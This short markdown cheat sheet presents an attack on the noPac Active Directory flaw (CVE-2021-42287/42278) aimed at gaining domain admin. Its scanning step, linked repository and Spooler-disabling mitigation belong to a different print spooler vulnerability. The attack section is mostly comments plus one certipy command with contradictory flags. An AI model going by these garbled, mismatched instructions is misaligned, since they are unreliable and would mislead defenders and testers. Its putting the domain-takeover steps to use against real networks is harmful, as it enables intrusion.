# noPac
- noPac (CVE-2021-42287, CVE-2021-42278)
- PTT, DCSYNC, Domain Admin
- https://github.com/cube0x0/CVE-2021-1675#scanning
## Scanning
- We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable

```shell
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py  

rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```
## Attack

```bash
# =========================================================
# PHASE 1: SPOOF THE COMPUTER ACCOUNT
# =========================================================

# 1. Change the sAMAccountName of a non-DC computer to end with '$' (spoofing)
# This step is often performed using the Certipy-for-NoPac tool or Impacket's rpcclient.
# The original computer account (non-DC) must be compromised or writeable.

# =========================================================
# PHASE 2: EXPLOIT (REQUEST TGT)
# =========================================================

# The NoPac attack is a two-step ticket request using the legitimate KDC service:
# 1. Request a TGS ticket for the spoofed computer account.
# 2. Request a new TGT using the ticket from step 1, which the KDC incorrectly signs 
#    with the Domain Controller's identity (granting full domain control).

# Tool execution (Example Certipy command):
certipy auth -u '<Target-Computer>$' -p '<Password>' -dc-ip <DC-IP> -no-pass -impersonate 'krbtgt' -kdc-ip <DC-IP>
```
### Mitigation
- Disable Spooler service
```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```
```bash




```